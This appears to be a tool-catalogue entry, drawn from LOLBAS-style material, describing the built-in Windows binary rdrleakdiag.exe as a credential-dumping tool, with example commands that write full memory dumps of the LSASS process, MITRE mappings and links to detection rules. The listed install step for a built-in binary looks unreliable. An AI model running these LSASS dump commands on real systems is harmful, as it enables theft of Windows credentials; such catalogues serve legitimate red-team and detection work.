---
id: windows-credential-rdrleakdiag
namespace: windows:credential:rdrleakdiag
name: rdrleakdiag
description: 'Microsoft Windows resource leak diagnostic tool Located at: c:\windows\system32\rdrleakdiag.exe; c:\Windows\SysWOW64\rdrleakdiag.exe.'
author: John Dwyer
version: 1.0.0
capabilities:
- credential.dump
platforms:
- windows
risk_level: critical
trust_level: community
execution_policy: enabled
architectures:
- amd64
dependencies: []
related_tools: []
artifacts: []
workflow_edges:
  produces:
  - command-output
  consumes: []
contract:
  inputs: []
  outputs:
  - type: process.output
    description: Command execution output
  side_effects:
  - process_spawn
  resource_cost:
    cpu: low
    memory_mb: 16
    network: low
    disk_io: low
resource_profile:
  cpu: low
  memory_mb: 16
  network: low
  disk_io: low
allowed-tools:
- rdrleakdiag
parameters: []
features: []
execution:
  template: rdrleakdiag
  sandbox: execFile
  timeout_seconds: 30
  shell: false
global_vars: {}
examples:
- description: Dump process by PID and create a dump file (creates files called `minidump_<PID>.dmp` and `results_<PID>.hlk`). (Dump process by PID.)
  command: rdrleakdiag.exe /p 940 /o {PATH_ABSOLUTE:folder} /fullmemdmp /wait 1
- description: Dump LSASS process by PID and create a dump file (creates files called `minidump_<PID>.dmp` and `results_<PID>.hlk`). (Dump LSASS process.)
  command: rdrleakdiag.exe /p 832 /o {PATH_ABSOLUTE:folder} /fullmemdmp /wait 1
- description: After dumping a process using `/wait 1`, subsequent dumps must use `/snap` (creates files called `minidump_<PID>.dmp` and `results_<PID>.hlk`). (Dump LSASS process mutliple times.)
  command: rdrleakdiag.exe /p 832 /o {PATH_ABSOLUTE:folder} /fullmemdmp /snap
references:
- label: 1299071304805560321?s=21
  url: https://twitter.com/0gtweet/status/1299071304805560321?s=21
- label: ''
  url: https://www.pureid.io/dumping-abusing-windows-credentials-part-1/
- label: '84'
  url: https://github.com/LOLBAS-Project/LOLBAS/issues/84
techniques:
- credential-access
mitre_ids:
- T1003
- T1003.001
detections:
- type: sigma
  url: https://github.com/SigmaHQ/sigma/blob/6312dd1d44d309608552105c334948f793e89f48/rules/windows/process_creation/proc_creation_win_rdrleakdiag_process_dumping.yml
- type: elastic
  url: https://www.elastic.co/guide/en/security/current/potential-credential-access-via-windows-utilities.html
- type: elastic
  url: https://github.com/elastic/detection-rules/blob/5bdf70e72c6cd4547624c521108189af994af449/rules/windows/credential_access_cmdline_dump_tool.toml
install:
- method: choco
  package_name: rdrleakdiag
  commands:
  - choco install rdrleakdiag
---


# rdrleakdiag

rdrleakdiag is a Windows LOLBin. Microsoft Windows resource leak diagnostic tool Located at: c:\windows\system32\rdrleakdiag.exe; c:\Windows\SysWOW64\rdrleakdiag.exe.
